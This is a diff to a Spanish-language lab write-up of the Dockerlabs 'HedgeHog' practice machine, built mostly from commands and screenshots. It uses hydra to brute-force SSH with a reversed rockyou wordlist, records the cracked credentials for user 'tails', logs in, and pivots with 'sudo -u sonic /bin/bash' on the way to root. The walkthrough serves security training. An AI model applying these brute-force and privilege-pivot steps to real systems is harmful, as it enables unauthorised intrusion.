@@ -9,7 +9,11 @@ Tools:
 [[Ping]]
 [[NMAP]]
 [[Gobuster]]
+[[Puerto 22 SSH - SFTP (TCP)]]
 
+
+Mirror image:
+![[Dockerlabs -HedgeHog -  Mirror image.png]]
 
 
 # Despliegue:
@@ -26,7 +30,7 @@ sudo bash autodeploy.sh hedgehog.tar
 ping -c1 172.17.0.2
 ```
 
-![[Dockerlabs - JedgeHog - Ping.png]]
+![[Dockerlabs - HedgeHog - Ping.png]]
 
 TRL: 64 --> Linux
 
@@ -63,6 +67,7 @@ hydra -l tails -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2
 
 ![[Dockerlabs - HedgeHog -Rockyou normal.png]]
 pero no encontramos nada, al ver el nombre del usuario tails: se nos ocurre invertir el rockyou
+que básicamente consiste en poner el rockyou al reves y eliminar los espacios
 comandos para invertir el rockyou:
 
 ```sh fold:"Invertir el rockyou"
@@ -77,8 +82,32 @@ Volvemos a lanzar hydra con el rockyou invertido:
 hydra -l tails -P /usr/share/wordlists/rockyouinvertido.txt ssh://172.17.0.2
 ```
 
+![[Dockerlabs - HedgeHog - Hydra result.png]]
 
 Datos obtenidos:
 Usuario: tails
 Password: 3117548331
+
+Conectamos por SSH
+
+```sh fold:"SSH connection"
+ssh tails@172.17.0.2   
+```
+![[Dockerlabs - HedgeHog - SSH connection.png]]
 # Escalada de privilegios
+
+```sh fold:"whoami and sudo -l"
+whoami
+sudo -l
+```
+
+![[Dockerlabs - HedgeHog -whoami - sudo -l.png]]
+
+vemos que no hay nada para escalar pero encontramos un usuario sonic
+
+pivoteamos con el usuario sonic:
+sudo -u sonic /bin/bash
+![[Dockerlabs - HedgeHog -User pivoting - sonic.png]]
+
+Volvemos a pivotar  ahora sobre el usuario root:
+![[Dockerlabs - HedgeHog -User pivoting - root.png]]
